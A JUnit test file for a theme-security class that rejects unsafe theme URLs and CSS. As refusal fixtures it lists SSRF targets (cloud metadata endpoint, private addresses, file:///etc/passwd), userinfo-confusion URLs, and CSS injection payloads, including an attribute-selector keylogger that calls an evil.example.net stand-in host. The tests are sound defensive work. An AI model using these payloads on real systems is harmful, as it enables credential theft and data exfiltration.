package com.osuserverlist.koneko.theme;

import static org.junit.jupiter.api.Assertions.assertEquals;
import static org.junit.jupiter.api.Assertions.assertFalse;
import static org.junit.jupiter.api.Assertions.assertNotEquals;
import static org.junit.jupiter.api.Assertions.assertThrows;
import static org.junit.jupiter.api.Assertions.assertTrue;

import java.util.List;

import org.junit.jupiter.api.DisplayName;
import org.junit.jupiter.api.Nested;
import org.junit.jupiter.api.Test;
import org.junit.jupiter.params.ParameterizedTest;
import org.junit.jupiter.params.provider.ValueSource;

/**
 * The refusals {@link ThemeSecurity} exists for.
 *
 * <p>These are written as the attacks they are meant to stop rather than as method coverage,
 * because the thing worth knowing about this class is not that its branches execute - it is
 * that a stylesheet cannot phone home and a staff form cannot be turned into a port scanner.
 * A name like {@code refusesAwsMetadataEndpoint} says what broke when it goes red.
 *
 * <h2>Why nothing here touches the network</h2>
 *
 * <p>{@link ThemeSecurity#requireFetchableUrl} resolves the host as its last step, so the
 * obvious way to test it is with a real domain name. That was tried and rejected: the suite
 * then fails on a machine with no DNS, or when a domain used as a fixture changes hands, and a
 * security test that cries wolf is one that gets commented out. Every case below is arranged
 * so the answer is decided before resolution is reached - by scheme, by allowlist, or by an IP
 * literal, which {@link java.net.InetAddress} parses without a lookup. The happy path uses a
 * loopback name, which is exempt from the resolve step by design. Verified by running the
 * suite against a dead resolver.
 *
 * <h2>Why some cases assert on the message</h2>
 *
 * <p>Several inputs would be refused by more than one rule. A test that only asserts "something
 * was thrown" passes even when the rule it was written for is gone, so where that applies the
 * assertion names the rule that has to do the refusing. This was not a precaution - loosening
 * the allowlist to a suffix match was caught by exactly these assertions and by nothing else.
 */
@DisplayName("ThemeSecurity")
class ThemeSecurityTest {

    /** A stand-in for what an operator would put in THEME_SOURCE_HOSTS. */
    private static final List<String> ALLOWED = List.of("themes.example.com", "localhost");

    @Nested
    @DisplayName("URL admission")
    class UrlAdmission {

        @Test
        @DisplayName("allows http on a loopback host the operator named")
        void allowsNamedLoopback() {
            // The documented local development workflow, and the one case that reaches no
            // resolver.
            ThemeSecurity.requireFetchableUrl("http://localhost:3000/api/themes", ALLOWED);
        }

        @Test
        @DisplayName("refuses http on a public host")
        void refusesPlainHttp() {
            // A theme is code, so plain http would mean the approval covers whatever a
            // network hop substitutes in transit.
            IllegalArgumentException e = assertThrows(IllegalArgumentException.class,
                    () -> ThemeSecurity.requireFetchableUrl("http://themes.example.com/api", ALLOWED));

            assertTrue(e.getMessage().contains("https"), e.getMessage());
        }

        @Test
        @DisplayName("refuses a host that is not on the allowlist")
        void refusesUnlistedHost() {
            IllegalArgumentException e = assertThrows(IllegalArgumentException.class,
                    () -> ThemeSecurity.requireFetchableUrl("https://evil.example.net/api", ALLOWED));

            assertTrue(e.getMessage().contains("THEME_SOURCE_HOSTS"), e.getMessage());
        }

        @Test
        @DisplayName("refuses everything when the allowlist is empty")
        void refusesWhenAllowlistEmpty() {
            // Closed by default: a deployment that has not configured this fetches nothing
            // rather than fetching anything.
            assertThrows(IllegalArgumentException.class,
                    () -> ThemeSecurity.requireFetchableUrl("https://themes.example.com/api", List.of()));

            assertThrows(IllegalArgumentException.class,
                    () -> ThemeSecurity.requireFetchableUrl("https://themes.example.com/api", null));
        }

        @Test
        @DisplayName("refuses the cloud metadata endpoint even when it is allowlisted")
        void refusesAwsMetadataEndpoint() {
            // The reason the address check exists at all. 169.254.169.254 hands out
            // credentials to anything that can reach it, so it stays refused even when an
            // operator names it - by mistake, or because somebody talked them into it.
            IllegalArgumentException e = assertThrows(IllegalArgumentException.class,
                    () -> ThemeSecurity.requireFetchableUrl(
                            "https://169.254.169.254/latest/meta-data/", List.of("169.254.169.254")));

            assertTrue(e.getMessage().contains("inside the network"), e.getMessage());
        }

        @ParameterizedTest(name = "refuses {0}")
        @DisplayName("refuses an allowlisted address inside the deployment")
        @ValueSource(strings = {
            "https://10.0.0.5/api",         // private range
            "https://192.168.1.10/api",     // private range
            "https://172.16.0.1/api",       // private range
            "https://169.254.169.254/api",  // link local, the metadata range
            "https://0.0.0.0/api",          // wildcard
            "https://[fe80::1]/api"         // link local, v6
        })
        void refusesInternalAddresses(String url) {
            // Each host is named explicitly in the allowlist, so this proves the address check
            // is what refuses them rather than the allowlist. IP literals need no resolver.
            String host = url.substring("https://".length(), url.length() - "/api".length());

            IllegalArgumentException e = assertThrows(IllegalArgumentException.class,
                    () -> ThemeSecurity.requireFetchableUrl(url, List.of(host)));

            assertTrue(e.getMessage().contains("inside the network"),
                    "refused, but not by the address check: " + e.getMessage());
        }

        @ParameterizedTest(name = "allows {0} only when the operator names it")
        @DisplayName("allows a loopback host, but only as a deliberate opt-in")
        @ValueSource(strings = { "localhost", "127.0.0.1", "[::1]" })
        void allowsLoopbackOnlyWhenAllowlisted(String host) {
            // Loopback is exempt from the address check on purpose: it is how the documented
            // local theme workflow works, and reaching the same machine is not the problem the
            // check exists for. It stays an opt-in, so the exemption is unreachable by default.
            ThemeSecurity.requireFetchableUrl("https://" + host + "/api", List.of(host));

            assertThrows(IllegalArgumentException.class,
                    () -> ThemeSecurity.requireFetchableUrl(
                            "https://" + host + "/api", List.of("themes.example.com")));
        }

        @ParameterizedTest(name = "refuses scheme in {0}")
        @DisplayName("refuses a scheme that is not http(s)")
        @ValueSource(strings = {
            "file:///etc/passwd",
            "ftp://themes.example.com/api",
            "gopher://themes.example.com/api",
            "jar:https://themes.example.com/a.jar!/b"
        })
        void refusesOtherSchemes(String url) {
            assertThrows(IllegalArgumentException.class,
                    () -> ThemeSecurity.requireFetchableUrl(url, ALLOWED));
        }

        @Test
        @DisplayName("refuses a URL with no host")
        void refusesMissingHost() {
            assertThrows(IllegalArgumentException.class,
                    () -> ThemeSecurity.requireFetchableUrl("https:///api", ALLOWED));
        }

        @ParameterizedTest(name = "refuses blank input [{0}]")
        @DisplayName("refuses blank input")
        @ValueSource(strings = { "", "   " })
        void refusesBlank(String url) {
            assertThrows(IllegalArgumentException.class,
                    () -> ThemeSecurity.requireFetchableUrl(url, ALLOWED));
        }

        @Test
        @DisplayName("refuses null input")
        void refusesNull() {
            assertThrows(IllegalArgumentException.class,
                    () -> ThemeSecurity.requireFetchableUrl(null, ALLOWED));
        }

        @Test
        @DisplayName("does not let a subdomain inherit its parent's entry")
        void refusesSubdomainOfAllowedHost() {
            // Whoever controls example.com controls every name under it, so matching has to be
            // the whole host and not a suffix.
            //
            // The assertion is on the message rather than on the throw alone. A name like this
            // does not resolve, so the address check would refuse it too - and a test that
            // accepted either refusal would keep passing if the allowlist were loosened to
            // endsWith, which is the exact bug it exists to catch.
            IllegalArgumentException e = assertThrows(IllegalArgumentException.class,
                    () -> ThemeSecurity.requireFetchableUrl(
                            "https://evil.themes.example.com/api", ALLOWED));

            assertTrue(e.getMessage().contains("THEME_SOURCE_HOSTS"),
                    "refused, but by the address check rather than the allowlist: " + e.getMessage());
        }

        @Test
        @DisplayName("does not let a lookalike host end in an allowlisted name")
        void refusesSuffixLookalike() {
            // notthemes.example.com ends with the allowlisted string without being a subdomain
            // of it, so this catches a naive endsWith that forgets the dot.
            IllegalArgumentException e = assertThrows(IllegalArgumentException.class,
                    () -> ThemeSecurity.requireFetchableUrl(
                            "https://notthemes.example.com/api", ALLOWED));

            assertTrue(e.getMessage().contains("THEME_SOURCE_HOSTS"), e.getMessage());
        }

        @Test
        @DisplayName("is not fooled by credentials in front of the host")
        void refusesUserinfoConfusion() {
            // https://themes.example.com@evil.example.net/ reads as the allowlisted host to a
            // human and fetches from evil.example.net. The parse has to disagree with the eye.
            IllegalArgumentException e = assertThrows(IllegalArgumentException.class,
                    () -> ThemeSecurity.requireFetchableUrl(
                            "https://themes.example.com@evil.example.net/api", ALLOWED));

            assertTrue(e.getMessage().contains("THEME_SOURCE_HOSTS"),
                    "refused for the wrong reason: " + e.getMessage());
        }

        @Test
        @DisplayName("compares the host without regard to case")
        void matchesHostCaseInsensitively() {
            // Host names are case insensitive, so an uppercase spelling must not be a way
            // around the allowlist - in either direction.
            ThemeSecurity.requireFetchableUrl("http://LOCALHOST:3000/api", ALLOWED);
            ThemeSecurity.requireFetchableUrl("http://localhost:3000/api", List.of("LOCALHOST"));
        }

        @Test
        @DisplayName("ignores whitespace around an allowlist entry")
        void trimsAllowlistEntries() {
            // THEME_SOURCE_HOSTS is a comma separated string typed by a human, so
            // "a.com, b.com" must not produce an entry that silently never matches.
            ThemeSecurity.requireFetchableUrl("http://localhost/api", List.of("  localhost  "));
        }

        @Test
        @DisplayName("ignores whitespace around the URL itself")
        void trimsUrl() {
            ThemeSecurity.requireFetchableUrl("  http://localhost:3000/api  ", ALLOWED);
        }
    }

    @Nested
    @DisplayName("CSS admission")
    class CssAdmission {

        @Test
        @DisplayName("allows plain styling")
        void allowsPlainCss() {
            String css = ".a{color:#fff;font-size:14px}";

            assertEquals(css, ThemeSecurity.requireSafeCss(css));
        }

        @Test
        @DisplayName("allows an image the theme carries itself")
        void allowsDataUriImage() {
            // A theme that cannot carry its own background is not much of a theme, and a
            // data: URI reaches nobody.
            ThemeSecurity.requireSafeCss(".a{background:url(data:image/png;base64,AAA)}");
            ThemeSecurity.requireSafeCss(".a{background:url(blob:abc)}");
        }

        @Test
        @DisplayName("treats null and blank CSS as empty rather than failing")
        void treatsMissingCssAsEmpty() {
            // A theme with no CSS is normal input, not an error.
            assertEquals("", ThemeSecurity.requireSafeCss(null));
            assertEquals("", ThemeSecurity.requireSafeCss("   "));
        }

        @ParameterizedTest(name = "refuses [{0}]")
        @DisplayName("refuses a second stylesheet arriving after the approved one")
        @ValueSource(strings = {
            "@import url('//evil.example.net/x.css');",
            "@IMPORT url('//evil.example.net/x.css');",
            "@namespace svg url(http://www.w3.org/2000/svg);",
            "@document url-prefix() { .a { color: red } }"
        })
        void refusesForbiddenAtRules(String css) {
            // The approval names a payload. An @import is an unreviewed second payload, and it
            // carries the visitor's IP to whoever serves it.
            assertThrows(IllegalArgumentException.class, () -> ThemeSecurity.requireSafeCss(css));
        }

        @ParameterizedTest(name = "refuses [{0}]")
        @DisplayName("refuses a stylesheet that reaches the network")
        @ValueSource(strings = {
            "input[value^=a]{background:url(//evil.example.net/a)}",
            ".a{background:url(https://evil.example.net/a)}",
            ".a{background:url(http://evil.example.net/a)}",
            ".a{background:url( '//evil.example.net/a' )}",
            ".a{background:URL(\"//evil.example.net/a\")}"
        })
        void refusesRemoteUrls(String css) {
            // The first case is the one that matters: an attribute selector plus a remote
            // url() is a keylogger built out of stylesheet, one request per character typed.
            IllegalArgumentException e = assertThrows(IllegalArgumentException.class,
                    () -> ThemeSecurity.requireSafeCss(css));

            assertTrue(e.getMessage().contains("remote"), e.getMessage());
        }

        @ParameterizedTest(name = "refuses [{0}]")
        @DisplayName("refuses script execution from a stylesheet")
        @ValueSource(strings = {
            ".a{width:expression(alert(1))}",
            ".a{-moz-binding:url(x.xml)}",
            ".a{behavior:url(x.htc)}",
            ".a{behaviour:url(x.htc)}"
        })
        void refusesScriptConstructs(String css) {
            assertThrows(IllegalArgumentException.class, () -> ThemeSecurity.requireSafeCss(css));
        }

        @Test
        @DisplayName("refuses CSS larger than the cap")
        void refusesOversizedCss() {
            // The cap is 200 KB; a megabyte of CSS is a denial of service, not a colour scheme.
            String huge = ".a{color:#fff}".repeat(20_000);

            IllegalArgumentException e = assertThrows(IllegalArgumentException.class,
                    () -> ThemeSecurity.requireSafeCss(huge));

            assertTrue(e.getMessage().contains("200 KB"), e.getMessage());
        }
    }

    @Nested
    @DisplayName("custom property names")
    class VariableNames {

        @ParameterizedTest(name = "allows {0}")
        @ValueSource(strings = { "--accent", "--accent-hover", "--c1", "--A-b-2" })
        void allowsCustomProperties(String name) {
            assertTrue(ThemeSecurity.isSafeVariableName(name));
        }

        @ParameterizedTest(name = "refuses {0}")
        @ValueSource(strings = {
            "color",                    // not a custom property: would set a real one
            "-accent",                  // single dash
            "--a:b;c",                  // closes the declaration and starts another
            "--a}html{display:none",    // closes the rule entirely
            "--a b",                    // whitespace
            "--"                        // no name at all
        })
        void refusesEverythingElse(String name) {
            assertFalse(ThemeSecurity.isSafeVariableName(name));
        }

        @Test
        @DisplayName("refuses null")
        void refusesNull() {
            assertFalse(ThemeSecurity.isSafeVariableName(null));
        }

        @Test
        @DisplayName("refuses a name longer than the cap")
        void refusesOverlongName() {
            assertFalse(ThemeSecurity.isSafeVariableName("--" + "a".repeat(80)));
        }
    }

    @Nested
    @DisplayName("custom property values")
    class VariableValues {

        @ParameterizedTest(name = "allows {0}")
        @ValueSource(strings = {
            "#ff4d8d",
            "rgb(255, 77, 141)",
            "rgba(255, 77, 141, 0.5)",
            "hsl(340, 100%, 50%)",
            "calc(100% - 4px)",
            "var(--accent)",
            "clamp(1rem, 2vw, 3rem)",
            "linear-gradient(#fff, #000)",
            "2px",
            "bold"
        })
        void allowsColourSchemeVocabulary(String value) {
            assertTrue(ThemeSecurity.isSafeVariableValue(value), value);
        }

        @ParameterizedTest(name = "refuses {0}")
        @ValueSource(strings = {
            "url(//evil.example.net/a)",            // reaches the network
            "red; background:url(//evil/a)",        // escapes its own declaration
            "expression(alert(1))",                 // executes
            "attr(href)",                           // reads the document
            "image-set('//evil/a' 1x)",             // reaches the network
            "\"quoted\"",                           // quotes are not in the vocabulary
            "a:b"                                   // colon: starts another declaration
        })
        void refusesEverythingElse(String value) {
            assertFalse(ThemeSecurity.isSafeVariableValue(value), value);
        }

        @Test
        @DisplayName("refuses a disallowed function hidden among allowed ones")
        void refusesDisallowedFunctionAmongAllowed() {
            // Every call in the value is checked, not just the first: finding rgb() at the
            // front must not vouch for what follows it.
            assertFalse(ThemeSecurity.isSafeVariableValue("rgb(1,2,3) url(//evil/a)"));
            assertFalse(ThemeSecurity.isSafeVariableValue("calc(1px) attr(href)"));
        }

        @Test
        @DisplayName("refuses a function name spelled in a different case")
        void refusesRegardlessOfCase() {
            // The allowlist is case insensitive, so URL( must be refused exactly like url(.
            assertFalse(ThemeSecurity.isSafeVariableValue("URL(//evil/a)"));
            assertFalse(ThemeSecurity.isSafeVariableValue("Url(//evil/a)"));
        }

        @ParameterizedTest(name = "refuses blank [{0}]")
        @ValueSource(strings = { "", "   " })
        void refusesBlank(String value) {
            assertFalse(ThemeSecurity.isSafeVariableValue(value));
        }

        @Test
        @DisplayName("refuses null")
        void refusesNull() {
            assertFalse(ThemeSecurity.isSafeVariableValue(null));
        }

        @Test
        @DisplayName("refuses a value longer than the cap")
        void refusesOverlongValue() {
            assertFalse(ThemeSecurity.isSafeVariableValue("#fff " + "a".repeat(200)));
        }
    }

    @Nested
    @DisplayName("fingerprint")
    class Fingerprint {

        @Test
        @DisplayName("is stable for the same payload")
        void isStable() {
            String json = "{\"id\":\"x\",\"custom_js\":\"a\"}";

            assertEquals(ThemeSecurity.fingerprint(json), ThemeSecurity.fingerprint(json));
        }

        @Test
        @DisplayName("changes when the script changes")
        void changesWithTheScript() {
            // The property the whole consent model rests on: a source that swaps its code
            // loses the approval it was given, so the theme deactivates itself instead of
            // shipping something nobody looked at.
            assertNotEquals(
                    ThemeSecurity.fingerprint("{\"id\":\"x\",\"custom_js\":\"a\"}"),
                    ThemeSecurity.fingerprint("{\"id\":\"x\",\"custom_js\":\"b\"}"));
        }

        @Test
        @DisplayName("changes on a one character edit")
        void changesOnASingleCharacter() {
            assertNotEquals(
                    ThemeSecurity.fingerprint("{\"a\":1}"),
                    ThemeSecurity.fingerprint("{\"a\":2}"));
        }

        @Test
        @DisplayName("is 64 lowercase hex characters")
        void isHexOfExpectedLength() {
            // Stored in a config file and compared as a string, so the encoding is part of the
            // contract rather than an implementation detail.
            String hash = ThemeSecurity.fingerprint("{}");

            assertEquals(64, hash.length());
            assertTrue(hash.matches("^[0-9a-f]{64}$"), hash);
        }

        @Test
        @DisplayName("matches the known SHA-256 of the empty string")
        void matchesKnownSha256() {
            // Pinned against a value computed outside this codebase, so this would catch the
            // algorithm being swapped as well as the hex encoding being wrong.
            assertEquals("e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855",
                    ThemeSecurity.fingerprint(""));
        }

        @Test
        @DisplayName("matches the UTF-8 SHA-256 of non-ASCII text")
        void hashesNonAsciiAsUtf8() {
            // The expected value is the UTF-8 digest of "héllo". The ISO-8859-1 digest is
            // c63c19ed..., so an encoding change of that kind would show up here.
            //
            // Worth knowing what this does not prove: since JEP 400 the default charset is
            // UTF-8 on every JDK this project supports, so dropping the explicit
            // StandardCharsets.UTF_8 in the source would not fail this test. The explicit
            // charset is still correct - it is what stops the digest depending on the JVM's
            // locale on an older or reconfigured runtime - but it is documentation of intent
            // that the platform now happens to agree with, not something a test can pin here.
            assertEquals("3c48591d8d098a4538f5e013dfcf406e948eac4d3277b10bf614e295d6068179",
                    ThemeSecurity.fingerprint("héllo"));
        }
    }
}
